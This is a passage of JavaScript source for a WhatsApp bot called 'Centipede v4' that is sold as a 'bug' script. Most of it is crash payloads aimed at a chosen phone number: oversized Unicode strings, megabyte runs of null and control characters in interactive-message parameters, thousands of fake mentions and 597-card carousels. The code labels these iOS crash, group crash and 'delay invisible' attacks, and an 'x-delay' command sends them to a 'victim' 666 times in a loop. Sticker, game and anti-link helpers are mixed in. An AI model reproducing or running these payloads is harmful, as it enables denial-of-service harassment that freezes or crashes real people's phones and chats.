          name: "🧪⃟꙰ 𝐱𝐂𝐮𝐫𝐬𝐞𝐝𝐍𝐅 ✶" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000), 
          address: "🧪⃟꙰ 𝐱𝐂𝐮𝐫𝐬𝐞𝐝𝐍𝐅 ✶" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000), 
          url: `https://zeno-iosx.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
          jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
        },
      },
    },
  }, {});
 
  let msg2 = generateWAMessageFromContent(
    target,
    {
      contactMessage: {
        displayName:
          "🧪⃟꙰ 𝐱𝐂𝐮𝐫𝐬𝐞𝐝𝐍𝐅 ✶ > 666" +
          "𑇂𑆵𑆴𑆿".repeat(10000),
        vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;🧪⃟꙰ 𝐱𝐂𝐮𝐫𝐬𝐞𝐝𝐍𝐅 ✶ > 666${"𑇂𑆵𑆴𑆿".repeat(10000)};;;\nFN:🧪⃟꙰ 𝐱𝐂𝐮𝐫𝐬𝐞𝐝𝐍𝐅 ✶ > 666${"𑇂𑆵𑆴𑆿".repeat(10000)}\nNICKNAME:🧪⃟꙰ 𝐱𝐂𝐮𝐫𝐬𝐞𝐝𝐍𝐅 ✶ > 666${"ᩫᩫ".repeat(4000)}\nORG:🧪⃟꙰ 𝐱𝐂𝐮𝐫𝐬𝐞𝐝𝐍𝐅 ✶ > 666${"ᩫᩫ".repeat(4000)}\nTITLE:🧪⃟꙰ 𝐱𝐂𝐮𝐫𝐬𝐞𝐝𝐍𝐅 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem1.TEL;waid=6287873499996:+62 878-7349-9996\nitem1.X-ABLabel:Telepon\nitem2.EMAIL;type=INTERNET:🧪⃟꙰ 𝐱𝐂𝐮𝐫𝐬𝐞𝐝𝐍𝐅 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem2.X-ABLabel:Kantor\nitem3.EMAIL;type=INTERNET:🧪⃟꙰ 𝐱𝐂𝐮𝐫𝐬𝐞𝐝𝐍𝐅 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem3.X-ABLabel:Kantor\nitem4.EMAIL;type=INTERNET:🧪⃟꙰ 𝐱𝐂𝐮𝐫𝐬𝐞𝐝𝐍𝐅 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem4.X-ABLabel:Pribadi\nitem5.ADR:;;🧪⃟꙰ 𝐱𝐂𝐮𝐫𝐬𝐞𝐝𝐍𝐅 ✶ > 666${"ᩫᩫ".repeat(4000)};;;;\nitem5.X-ABADR:ac\nitem5.X-ABLabel:Rumah\nX-YAHOO;type=KANTOR:🧪⃟꙰ 𝐱𝐂𝐮𝐫𝐬𝐞𝐝𝐍𝐅 ✶ > 666${"ᩫᩫ".repeat(4000)}\nPHOTO;BASE64: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\nX-WA-BIZ-NAME:🧪⃟꙰ 𝐱𝐂𝐮𝐫𝐬𝐞𝐝𝐍𝐅 ✶ > 666${"ᩫᩫ".repeat(4000)}\nEND:VCARD`,
        contextInfo: {
          participant: target,
          externalAdReply: {
            automatedGreetingMessageShown: true,
            automatedGreetingMessageCtaType: "\u0000".repeat(100000),
            greetingMessageBody: "\u0000"
          }
        }
      }
    },
    {}
  );
    
  await kaneki.relayMessage(target, {
    groupStatusMessageV2: {
      message: msg.message,
     },
    }, ptcp ? 
    { 
      messageId: msg.key.id,
      participant: { jid: target }
    } : { messageId: msg.key.id }
  );
  await sleep(5000);
    await kaneki.relayMessage("status@broadcast", msg2.message, {
    messageId: msg2.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: { jid: target },
          content: undefined
        }]
      }]
    }]
  });
}
//-------------------( END OF BUGS )--------------//
//------------------( DELAY INVISIBLE )-------------//
async function Invis(target) {
  let D9XMsg = await generateWAMessageFromContent(
    target,
    {
      groupStatusMessageV2: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "\u100b",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\x10".repeat(1045000),
              version: 3,
            },
            entryPointConversionSource: "call_permission_message",
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background:
        "#" +
        Math.floor(Math.random() * 16777215)
          .toString(16)
          .padStart(6, "99999999"),
    }
  );
  
  let D9XMsg2 = await generateWAMessageFromContent(
    target,
    {
      groupsStatusMessageV2: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "X",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\x10".repeat(1045000),
              version: 3,
            },
            entryPointConversionSource: "call_permission_request",
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background:
        "#" +
        Math.floor(Math.random() * 16777215)
        .toString(16)
        .padStart(6, "99999999"),
    }
  ); 
  
  let D9XMsg3 = {
   groupStatusMessageV2: {
    message: {
     messageContextInfo: {
      deviceListMetadata: {},
      deviceListMetadataVersion: 2,
     },
     interactiveMessage: {
      contextInfo: {
       mentionedJid: [target],
       isForwarded: true,
       forwardingScore: 999,
       businessMessageForwardInfo: {
        businessOwnerJid: target,
       },
      },
      body: {
       text: "X",
      },
      nativeFlowMessage: {
       buttons: [
        {
         name: "single_select",
         buttonParamsJson: "\u0000".repeat(7000),
        },
        {
         name: "call_permission_request",
         buttonParamsJson: "\u0000".repeat(1000000),
        },
        {
         name: "mpm",
         buttonParamsJson: "\u0000".repeat(7000),
        },
        {
         name: "mpm",
         buttonParamsJson: "\u0000".repeat(7000),
        },
        
       ],
      },
     },
    },
   },
  };

  await kaneki.relayMessage(target, D9XMsg3, {
   participant: { jid: target },
  });
await kaneki.relayMessage(
    "status@broadcast",
    D9XMsg.message,
    {
      messageId: D9XMsg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                },
              ],
            },
          ],
        },
      ],
    }
  );
  
  await kaneki.relayMessage(
    "status@broadcast",
    D9XMsg2.message,
    {
      messageId: D9XMsg2.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                },
              ],
            },
          ],
        },
      ],
    }
  );  
}
//-------------( END OF GROUP BUG )---------------//
//-------------( IOS CRASH BUG )------------//
async function DCrashIos(kaneki, target) {
  let message = {
    locationMessage: {
      name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
      address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000)
    } 
  }; 
  
  const msg = await generateWAMessageFromContent(target, message, {});
  await kaneki.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta", attrs: {}, content: [{
        tag: "mentioned_users", attrs: {}, content: [{
          tag: "to", attrs: { jid: target }, content: undefined
        }]
      }]
    }]
  });
}
//--------------( Group Crash No Click )-------------//
async function ExoGsButonsRspn(target, ptcp = true) {
  let mentions = [
    "13651718@s.whatsapp.net",
    ...Array.from(
      { length: 1900 },
      () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
    )
  ];
  
  const msg = generateWAMessageFromContent(
    target, 
    {
      buttonsResponseMessage: {
        selectedButtonId: "payment_info",
        selectedDisplayText: "𝐄𝐱𝐨𝐭𝐢𝐜𝐬𝐓𝐫𝟒𝐬𝐡",
        contextInfo: {
          participant: target,
          mentionedJid: mentions,
          isForwarded: true,
          forwardingScore: 9999,
          urlTrackingMap: {
            urlTrackingMapElements: Array.from({ length: 10000 }, () => ({})),
          }
        }
      }
    },
    {}
  );
  
  await kaneki.relayMessage(target, {
    groupStatusMessageV2: {
      message: msg.message,
    }
  }, ptcp ?
  {
    messageId: msg.key.id,
    participant: { jid: target },
  } : { messageId: msg.key.id });
}
//-( END OF BUG )--------------//

/// function sticker
async function styletext(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
            let $ = cheerio.load(data)
            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}
async function styletexts(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
            let $ = cheerio.load(data)
            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}
function getRandomFile(ext) {
    return `${Math.floor(Math.random() * 10000)}${ext}`;
}
async function makeStickerFromUrl(imageUrl, kaneki, m) {
    try {
        let buffer;
        if (imageUrl.startsWith("data:")) {
            const base64Data = imageUrl.split(",")[1];
            buffer = Buffer.from(base64Data, 'base64');
        } else {
            const response = await axios.get(imageUrl, { responseType: 'arraybuffer' });
            buffer = Buffer.from(response.data, "binary");
        }
        
        const webpBuffer = await sharp(buffer)
            .resize(512, 512, { fit: 'contain', background: { r: 255, g: 255, b: 255, alpha: 0 } })
            .webp({ quality: 70 })
            .toBuffer();
        
        const penis = await addExif(webpBuffer, global.packname, global.author)

        const fileName = getRandomFile(".webp");
        fs.writeFileSync(fileName, webpBuffer);

        await kaneki.sendMessage(m.chat, {
            sticker: penis,
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    title: `KEN TECH`,
                    body: `Centipede`,
                    mediaType: 3,
                    renderLargerThumbnail: false,
                    thumbnailUrl: ThumbUrl, 
                    sourceUrl: `t.me/certifiedloner_16`
                }
            }
        }, { quoted: m });

        fs.unlinkSync(fileName);
    } catch (error) {
        console.error("Error creating sticker:", error);
        m.reply(' check console.');
    }
}
async function doneress () {
if (!q) throw "Done Response"
let pepec = q.replace(/[^0-9]/g, "")
let ressdone = `🎯
[ ꪉ ] done : _*${command}*_❕`

  let buttons = [
        { buttonId: ".xmenu", buttonText: { displayText: "Back To Menu" } }, 
         { buttonId: ".script", buttonText: { displayText: "Buy Script" } }
    ];

    let buttonMessage = {
        image: thumb, 
        caption: ressdone,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363424103965290@newsletter",
                newsletterName: "Ken"
            }
        },
        footer: "© Centipede",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };
await kaneki.sendMessage(m.chat, buttonMessage, { quoted: cursor });
}
async function ephoto(url, texk) {
let form = new FormData 
let gT = await axios.get(url, {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
  }
})
let $ = cheerio.load(gT.data)
let text = texk
let token = $("input[name=token]").val()
let build_server = $("input[name=build_server]").val()
let build_server_id = $("input[name=build_server_id]").val()
form.append("text[]", text)
form.append("token", token)
form.append("build_server", build_server)
form.append("build_server_id", build_server_id)
let res = await axios({
  url: url,
  method: "POST",
  data: form,
  headers: {
    Accept: "*/*",
    "Accept-Language": "en-US,en;q=0.9",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"]?.join("; "),
    ...form.getHeaders()
  }
})
let $$ = cheerio.load(res.data)
let json = JSON.parse($$("input[name=form_value_input]").val())
json["text[]"] = json.text
delete json.text
let { data } = await axios.post("https://en.ephoto360.com/effect/create-image", new URLSearchParams(json), {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"].join("; ")
    }
})
return build_server + data.image
}

  //game
        global.game = global.game ? global.game : {}
        let room = Object.values(global.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
        if (room) {
            let ok
            let isWin = !1
            let isTie = !1
            let isSurrender = !1
            // reply(`[DEBUG]\n${parseInt(m.text)}`)
            if (!/^([1-9]|(me)?giveup|surr?ender|off|skip)$/i.test(m.text)) return
            isSurrender = !/^[1-9]$/.test(m.text)
            if (m.sender !== room.game.currentTurn) {
                if (!isSurrender) return !0
            }
            if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
                reply({
                    '-3': 'The game is over',
                    '-2': 'Invalid',
                    '-1': 'Invalid Position',
                    0: 'Invalid Position',
                } [ok])
                return !0
            }
            if (m.sender === room.game.winner) isWin = true
            else if (room.game.board === 511) isTie = true
            let arr = room.game.render().map(v => {
                return {
                    X: '❌',
                    O: '⭕',
                    1: '1️⃣',
                    2: '2️⃣',
                    3: '3️⃣',
                    4: '4️⃣',
                    5: '5️⃣',
                    6: '6️⃣',
                    7: '7️⃣',
                    8: '8️⃣',
                    9: '9️⃣',
                } [v]
            })
            if (isSurrender) {
                room.game._currentTurn = m.sender === room.game.playerX
                isWin = true
            }
            let winner = isSurrender ? room.game.currentTurn : room.game.winner
            let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Won!` : isTie ? `Game over` : `Turn ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Type *surrender* to surrender and admit defeat`
            if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
                room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
            if (room.x !== room.o) kaneki.sendMessage(room.x, { text: str, mentions: parseMention(str) })
            kaneki.sendMessage(room.o, { text: str, mentions: parseMention(str) })
            if (isTie || isWin) {
                delete global.game[room.id]
            }
        }
        
// end

if (m.isGroup && global._antilink[m.chat]) {
    const detectLink = /(https?:\/\/[^\s]+)|(\b\S*\.com\S*\b)/gi;
    const msgText = m.text || m.body || '';
    if (detectLink.test(msgText) && !isAdmins && !m.key.fromMe) {
        await kaneki.sendMessage(m.chat, { delete: m.key });
    }
}

///bug func end
//=============={ MENU FUNCTION BUTTON + TAG }===================//
async function R9X2(kaneki, target, mention) {
  var R9X1 = {
    url: "https://mmg.whatsapp.net/o1/v/t24/f2/m233/AQNvaZ3Ct44hmtUdO06rYfwhlUk56KEtQ-CV0JL3bg-qPUdYT7vz6p7KtHbhFEXeBTsRKz01FTxydRdiMW88ynk1TRpQcVAm76Lb_ZIDKw?ccb=9-4&oh=01_Q5Aa4AHnhpSyXU1dhNgWvLCbzU4XEfA9JZ1HffIt6U6zDH_QMg&oe=69F44EB9&_nc_sid=e6ed6c&mms3=true",
    mimetype: "image/jpeg",
    fileSha256: "WMATZulCqZloXFfBTYPzATm2v74jGJv7thxNE7C8X8o=",
    fileLength: 162903,
    height: 1080,
    width: 1080,
    mediaKey: "qR4aFXwJdZbH0Zgi7uxA5Y4to6eJjhKD2V5mhn/ZQrc=",
    fileEncSha256: "JDCO/kG+BT0CCdsRsdKSixsDleGaJNZPCJMVomLox3A=",
    directPath: "/o1/v/t24/f2/m233/AQNvaZ3Ct44hmtUdO06rYfwhlUk56KEtQ-CV0JL3bg-qPUdYT7vz6p7KtHbhFEXeBTsRKz01FTxydRdiMW88ynk1TRpQcVAm76Lb_ZIDKw?ccb=9-4&oh=01_Q5Aa4AHnhpSyXU1dhNgWvLCbzU4XEfA9JZ1HffIt6U6zDH_QMg&oe=69F44EB9&_nc_sid=e6ed6c",
    mediaKeyTimestamp: 1775033718,
    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=",
    contextInfo: {
      pairedMediaType: "NOT_PAIRED_MEDIA"
    },
    scansSidecar: "2YCrK9uS0xGWeOGhQDDtgHrmdhks+9aRYU2v5pwgTYmXkWbuXBRpzg==",
    scanLengths: [
      10365,
      39303,
      40429,
      72806
    ],
    midQualityFileSha256: "lldAKS/9qixXmMdTvk0n/DUV7WJLwvT6BaZmOkbUDdE="
  };

  var cards = [];
  for (var r = 0; r < 597; r++) {
    cards.push({
      header: {
        imageMessage: R9X1,
        hasMediaAttachment: true
      },
      nativeFlowMessage: {
        messageParamsJson: "\0"
      }
    });
  }

  var R9X2 = await generateWAMessageFromContent(
    target,
    {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            body: { text: "\0" },
            carouselMessage: {
              cards: cards
            }
          }
        }
      }
    },
    {}
  );

  await kaneki.relayMessage(
    target,
    R9X2.message,
    mention
      ? { participant: target }
      : {}
  );
}
//==============END OF SINGLE SELECT BUG =============//

//=========== END OF BUG ==========//
switch(command) {
case 'bugmenu': 
case "menu": {
let Menu = `
╔═══〔 BUG MENU 〕═══╗
║    𝘾𝙚𝙣𝙩𝙞𝙥𝙚𝙙𝙚 v4
║    Dev: LORD KANEKI
╚═══════════════════╝

╭━━━━━━━━━━━━━━━━╮
┃ → .ping         
┃ → .addprem 
┃ → .delprem 
┃ → .checkdevice 
┃ → .autoread 
┃ → .autolike  
┃ → .autoreact 
╰━━━━━━━━━━━━━━━━╯

╭━━━━━━━━━━━━━━━━╮
┃ → .x-fc〔Android〕
┃ → .x-ios〔iOS〕
┃ → .delay-gc 
┃ → .x-delay〔Android〕
┃ → .x-gc
╰━━━━━━━━━━━━━━━━╯
┊┊┊
┊┊
┊`;
LbReceipt(Menu).then(() => {
  // Send kaneki.mp3 AFTER the menu has been sent
  kaneki.sendMessage(m.chat, {
    audio: kanekiplay,
    mimetype: 'audio/mpeg',
    ptt: false,
    fileName: 'kaneki.mp3'
  }, { quoted: m });
});
}
break
// END OF CASE MENU
// Coded By kaneki Tech
case 'x-delay': {

if (!q) return BugSentX(`\`Example:\` : ${prefix+command} 23480xxxxx`);
victim = text.split("|")[0]
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
await kaneki.sendMessage(m.chat, {react: {text: '⏳', key: m.key}})
await kaneki.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
  if (victim == "2347078612004") {
    return BugSentX("❌ ɪᴍᴘᴏssɪʙʟᴇ ᴛᴏ ʙᴜɢ ᴛʜɪs ɴᴜᴍʙᴇʀ");
  }
BugSentX(`┏━𒀭━┓ 🇨 🇪 🇳 🇹 🇮 🇵 🇪 🇩 🇪  ┗━𒀭━┛
⦿ ᴄᴏʀᴇ ɪɴғᴏ ⦿
┏━━━━━━━━━━━━━━━━━━━━━━┓
│ ◈ ʙᴏᴛ     ──›   🇨 🇪 🇳 🇹 🇮 🇵 🇪 🇩 🇪  v4 
│ ◈ ᴄᴏᴍᴍᴀɴᴅ  ──›  ${prefix+command}
│ ◈ ᴠᴇʀꜱɪᴏɴ  ──›  4.0 
│ ◈ ᴅᴇᴠ     ──›  🇰​​🇦​​🇳​​🇪​​🇰​​🇮​  
┗━━━━━━━━━━━━━━━━━━━━━━┛

⦿ ᴅᴇᴄʟᴀʀᴀᴛɪᴏɴ ⦿
「━━━━━━━━━━━━━━━━━━━━━━」
  呪いは従うものではない、支配するものだ
  A curse is not to be obeyed, it is to be controlled.
「━━━━━━━━━━━━━━━━━━━━━━」

⦿ ᴄᴜʀꜱᴇ ᴘʀɪɴᴄɪᴘʟᴇ ⦿
⟦ 規則は力の前では無意味 ⟧
⟦ Rules are meaningless before power ⟧`)
for (let i = 0; i < 666; i++) {
await Invis(target);
await new Promise(r => setTimeout(r, 1000));
await ExoGsButonsRspn(target, true);
}
    }  
break;
case 'x-fc': {

